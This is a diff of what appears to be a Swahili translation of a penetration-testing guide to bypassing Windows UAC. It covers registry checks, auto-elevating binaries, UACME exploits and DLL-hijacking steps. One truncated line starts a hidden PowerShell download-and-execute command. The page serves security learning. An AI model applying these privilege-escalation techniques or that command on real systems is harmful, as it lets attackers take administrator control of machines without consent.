@@ -41,7 +41,7 @@ Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection
 | [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Imezuiliwa                                                  |
 | [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Imezuiliwa                                                  |
 | [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Kuuliza idhini kwa binaries zisizo za Windows               |
-| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Kuuliza hati kwenye desktop salama                          |
+| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Kuuliza hati za utambulisho kwenye desktop salama          |
 | [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Imewezeshwa (default kwa nyumbani) Imezuiliwa (default kwa biashara) |
 | [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Imezuiliwa                                                  |
 | [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Imewezeshwa                                                |
@@ -51,9 +51,9 @@ Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection
 
 ### UAC Bypass Theory
 
-Baadhi ya programu zina **autoelevated automatically** ikiwa **mtumiaji ni** sehemu ya **kikundi cha wasimamizi**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary lazima iwe **imewekwa saini na Microsoft** pia.
+Baadhi ya programu zina **kujiinua kiotomatiki** ikiwa **mtumiaji ni** katika **kikundi cha wasimamizi**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary lazima iwe **imewekwa saini na Microsoft** pia.
 
-Kisha, ili **kuepuka** **UAC** (kuinua kutoka **kiwango cha kati** cha integrity **hadi juu**) baadhi ya washambuliaji hutumia aina hii ya binaries ili **kutekeleza msimbo wowote** kwa sababu itatekelezwa kutoka kwa **mchakato wa integrity wa kiwango cha juu**.
+Kisha, ili **kuepuka** **UAC** (kujiinua kutoka **kiwango cha kati** **hadi juu**) baadhi ya washambuliaji hutumia aina hii ya binaries ili **kutekeleza msimbo wa kiholela** kwa sababu itatekelezwa kutoka kwa **mchakato wa kiwango cha juu cha integrity**.
 
 Unaweza **kuangalia** _**Manifest**_ ya binary ukitumia zana _**sigcheck.exe**_ kutoka Sysinternals. Na unaweza **kuona** **kiwango cha integrity** cha michakato ukitumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).
 
@@ -66,7 +66,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-Ikiwa ni **`1`** basi UAC ni **imewashwa**, ikiwa ni **`0`** au haipo, basi UAC ni **haijawashwa**.
+Ikiwa ni **`1`** basi UAC ni **imewashwa**, ikiwa ni **`0`** au **haipo**, basi UAC ni **haijawashwa**.
 
 Kisha, angalia **ni kiwango gani** kimewekwa:
 ```
@@ -77,13 +77,13 @@ ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
 * Ikiwa **`0`** basi, UAC haitatoa ujumbe (kama **imezimwa**)
 * Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza faili ya binary kwa haki za juu (katika Desktop Salama)
-* Ikiwa **`2`** (**Nijulishe kila wakati**) UAC kila wakati itauliza uthibitisho kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
-* Ikiwa **`3`** kama `1` lakini si lazima kwenye Desktop Salama
-* Ikiwa **`4`** kama `2` lakini si lazima kwenye Desktop Salama
+* Ikiwa **`2`** (**Daima niarifu**) UAC daima itauliza uthibitisho kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
+* Ikiwa **`3`** kama `1` lakini si lazima katika Desktop Salama
+* Ikiwa **`4`** kama `2` lakini si lazima katika Desktop Salama
 * ikiwa **`5`**(**kawaida**) itauliza msimamizi kuthibitisha kuendesha binaries zisizo za Windows kwa mamlaka ya juu
 
 Kisha, unapaswa kuangalia thamani ya **`LocalAccountTokenFilterPolicy`**\
-Ikiwa thamani ni **`0`**, basi, mtumiaji wa **RID 500** (**Msimamizi wa ndani**) anaweza kufanya **kazi za usimamizi bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kundi "Administrators"** zinaweza kufanya hivyo.
+Ikiwa thamani ni **`0`**, basi, mtumiaji wa **RID 500** (**Msimamizi wa ndani**) anaweza kufanya **kazi za usimamizi bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kundi la "Administrators"** zinaweza kufanya hivyo.
 
 Na, hatimaye angalia thamani ya funguo **`FilterAdministratorToken`**\
 Ikiwa **`0`**(kawaida), akaunti ya **Msimamizi wa ndani inaweza** kufanya kazi za usimamizi wa mbali na ikiwa **`1`** akaunti ya msimamizi wa ndani **haiwezi** kufanya kazi za usimamizi wa mbali, isipokuwa `LocalAccountTokenFilterPolicy` imewekwa kuwa `1`.
@@ -157,14 +157,14 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 ### KRBUACBypass
 
-Hati na zana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Hati na chombo katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
 ### UAC bypass exploits
 
-[**UACME**](https://github.com/hfiref0x/UACME) ambayo ni **mkusanyiko** wa exploits kadhaa za UAC bypass. Kumbuka kwamba utahitaji **kukusanya UACME ukitumia visual studio au msbuild**. Kukusanya kutaunda executable kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unahitaji.**\
-Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maonyo kwa programu nyingine** ambazo zita **onya** **mtumiaji** kwamba kuna kitu kinatokea.
+[**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **mkusanyiko** wa exploits kadhaa za UAC bypass. Kumbuka kwamba utahitaji **kukusanya UACME ukitumia visual studio au msbuild**. Kukusanya kutaunda executable kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unahitaji.**\
+Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maombi mengine** ambayo yatamwonya **mtumiaji** kwamba kuna kitu kinatokea.
 
-UACME ina **toleo la kujenga ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayohusisha toleo lako:
+UACME ina **toleo la kujenga ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayohusiana na toleo lako:
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -188,7 +188,7 @@ You can get using a **meterpreter** session. Migrate to a **process** that has t
 
 Ikiwa una ufikiaji wa **GUI unaweza tu kukubali ujumbe wa UAC** unapoupata, huwezi kweli kuhitaji bypass. Hivyo, kupata ufikiaji wa GUI kutakuruhusu kupita UAC.
 
-Zaidi ya hayo, ikiwa unapata kikao cha GUI ambacho mtu alikuwa akitumia (labda kupitia RDP) kuna **zana fulani ambazo zitakuwa zinaendesha kama msimamizi** ambapo unaweza **kufanya** **cmd** kwa mfano **kama admin** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa ya **kujificha** zaidi.
+Zaidi ya hayo, ikiwa unapata kikao cha GUI ambacho mtu alikuwa akitumia (labda kupitia RDP) kuna **zana fulani ambazo zitakuwa zinaendesha kama msimamizi** ambapo unaweza **kufanya** **cmd** kwa mfano **kama admin** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa ya **siri** zaidi.
 
 ### Noisy brute-force UAC bypass
 
@@ -198,16 +198,16 @@ Ikiwa hujali kuhusu kuwa na kelele unaweza kila wakati **kufanya kitu kama** [**
 
 Ikiwa utaangalia **UACME** utaona kwamba **mara nyingi UAC bypasses inatumia udhaifu wa Dll Hijacking** (hasa kuandika dll mbaya kwenye _C:\Windows\System32_). [Soma hii kujifunza jinsi ya kupata udhaifu wa Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).
 
-1. Tafuta binary ambayo itafanya **autoelevate** (hakikisha kwamba wakati inatekelezwa inakimbia katika kiwango cha juu cha uaminifu).
+1. Tafuta binary ambayo itafanya **autoelevate** (hakikisha kwamba wakati inatekelezwa inafanya kazi katika kiwango cha juu cha uaminifu).
 2. Kwa procmon pata matukio ya "**NAME NOT FOUND**" ambayo yanaweza kuwa hatarini kwa **DLL Hijacking**.
-3. Huenda ukahitaji **kuandika** DLL ndani ya **njia zilizolindwa** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza kupita hii kwa kutumia:
-   1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu chombo hiki kinatekelezwa kutoka kiwango cha juu cha uaminifu).
-   2. **IFileOperation**: Windows 10.
-4. Andaa **script** ya nakala ya DLL yako ndani ya njia iliyolindwa na kutekeleza binary hatarini na inayojiongezea.
+3. Huenda ukahitaji **kuandika** DLL ndani ya baadhi ya **njia zilizolindwa** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza kupita hii kwa kutumia:
+1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu chombo hiki kinatekelezwa kutoka kiwango cha juu cha uaminifu).
+2. **IFileOperation**: Windows 10.
+4. Andaa **script** ya nakala ya DLL yako ndani ya njia iliyolindwa na kutekeleza binary inayoweza kuathirika na autoelevated.
 
 ### Another UAC bypass technique
 
-Inahusisha kuangalia ikiwa **binary ya autoElevated** inajaribu **kusoma** kutoka **registry** jina/path ya **binary** au **amri** itakayotekelezwa (hii ni ya kuvutia zaidi ikiwa binary inatafuta habari hii ndani ya **HKCU**).
+Inahusisha kuangalia ikiwa **binary ya autoElevated** inajaribu **kusoma** kutoka **registry** jina/njia ya **binary** au **amri** inayopaswa **kutekelezwa** (hii ni ya kuvutia zaidi ikiwa binary inatafuta habari hii ndani ya **HKCU**).
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
